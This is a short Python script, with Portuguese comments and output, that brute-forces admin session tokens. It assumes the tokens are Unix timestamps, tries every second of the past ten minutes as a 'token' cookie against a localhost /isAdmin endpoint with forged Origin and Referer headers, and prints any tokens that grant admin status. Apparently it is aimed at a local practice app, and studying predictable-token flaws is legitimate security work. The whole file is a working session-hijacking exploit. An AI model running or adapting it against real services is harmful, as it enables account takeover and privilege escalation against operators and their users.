import requests
import time

IS_ADMIN_URL = "http://localhost:8000/isAdmin"

HEADERS = {
    "Origin": "http://localhost:5500",
    "Referer": "http://localhost:5500",
}

def is_admin_token(token):
    cookies = {"token": str(token)}
    try:
        response = requests.get(IS_ADMIN_URL, headers=HEADERS, cookies=cookies, timeout=3)
        if response.status_code == 200 and '"is_admin": true' in response.text:
            print(f"[ADMIN] Token válido: {token}")
            return True
    except requests.RequestException:
        pass
    return False

if __name__ == "__main__":
    now = int(time.time())
    start = now - 600  # últimos 10 minutos
    end = now

    print(f"Verificando tokens de {start} até {end}...\n")

    admin_tokens = []

    for t in range(start, end + 1):
        if is_admin_token(t):
            admin_tokens.append(t)

    print("\nTokens de ADMIN encontrados:")
    if admin_tokens:
        for token in admin_tokens:
            print(f" - {token}")
    else:
        print("Nenhum token de admin encontrado.")
